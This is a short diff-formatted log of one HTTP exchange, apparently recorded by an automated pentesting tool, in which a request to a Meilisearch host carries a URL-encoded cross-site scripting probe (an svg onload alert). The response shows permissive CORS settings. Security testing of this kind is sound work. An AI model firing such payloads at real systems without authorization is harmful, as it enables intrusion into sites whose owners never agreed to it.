@@ -1,0 +1,22 @@
+REQUEST:
+GET https://meilisearch.baliprov.dev/?ref=%3Csvg%2Fonload%3Dalert%281%29%3E
+User-Agent: pentest-ai/1.6.2 (compatible; rv:a2cfe36ea2c0; +https://pentestai.xyz)
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+
+
+
+RESPONSE:
+HTTP 200
+Date: Wed, 25 Nov 2026 00:26:07 GMT
+Content-Type: application/json
+Transfer-Encoding: chunked
+Connection: keep-alive
+Server: nginx/1.10.3
+Content-Encoding: gzip
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, OPTIONS
+Access-Control-Allow-Headers: X-Meili-Api-Key,Access-Control-Allow-Origin,DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range
+Access-Control-Allow-Credentials: true
+Access-Control-Expose-Headers: Content-Length,Content-Range
+
+{"status":"MeiliSearch is running"}
